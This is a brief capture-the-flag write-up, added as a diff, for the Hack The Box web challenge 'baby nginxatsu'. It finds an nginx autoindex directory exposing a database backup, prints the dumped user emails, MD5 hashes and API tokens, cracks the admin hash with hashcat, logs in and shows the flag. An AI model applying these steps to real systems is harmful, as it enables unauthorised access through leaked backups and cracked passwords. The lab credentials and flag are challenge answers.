@@ -1,0 +1,40 @@
+access:
+http://159.65.81.48:30600/auth/login
+
+please register first:
+click generate config.
+access: http://159.65.81.48:30600/config/52
+take attention:
+ index index.php;
+        root /www/public;
+
+        # We sure hope so that we don't spill any secrets
+        # within the open directory on /storage
+        
+        location /storage {
+            autoindex on;
+        }
+
+access: http://159.65.81.48:30600/storage/
+download:
+v1_db_backup_1604123342.tar.gz                     13-Jul-2023 18:48               42496
+extract and open in using sqlitebrowser
+users table:
+id,name,email,password,api_token,remember_token,created_at,updated_at
+1,jr,nginxatsu-adm-01@makelarid.es,e7816e9a10590b1e33b87ec2fa65e6cd,WoXBapLePd9WdyulTBne7xRX345cF2PNU6m2m1Bj8WeJRcI1DrZ9b5EMazx6L4m6eDMD,,2023-07-13 18:48:52,2023-07-13 18:48:52
+2,Giovann1,nginxatsu-giv@makelarid.es,21a07d58e0bd973be0ab46be913776ea,RlfTPKIXtBr4d66qUacpATrssmsHCASdTMK3CoWSmpjC4j94YnYKWn8SvFJBuRigKyyz,,2023-07-13 18:48:52,2023-07-13 18:48:52
+3,me0wth,nginxatsu-me0wth@makelarid.es,c81809700ffba6b66baa4dd5c1a77e20,tDA1B8nmhC3DiTvcZF2FQNY7PCxOgmfWYL7XNdTBjdDzKBEEPZoq1PReAtn1u1qjwVLw,,2023-07-13 18:48:52,2023-07-13 18:48:52
+
+let's crack it.
+command: hashcat -a 0 -m 0 crackme.txt /home/donika-pentest/Documents/hackthebox/linux/26_postman_easy/rockyou.txt 
+result:
+e7816e9a10590b1e33b87ec2fa65e6cd:adminadmin1
+
+let's login 
+email: nginxatsu-adm-01@makelarid.es
+password: adminadmin1
+
+flag: HTB{ng1ngx_r34lly_b3_sp1ll1ng_my_w3ll_h1dd3n_s3cr3ts??}
+
+resource:
+https://cyb3rwhitesnake.medium.com/htb-baby-nginxatsu-web-92f635590b97
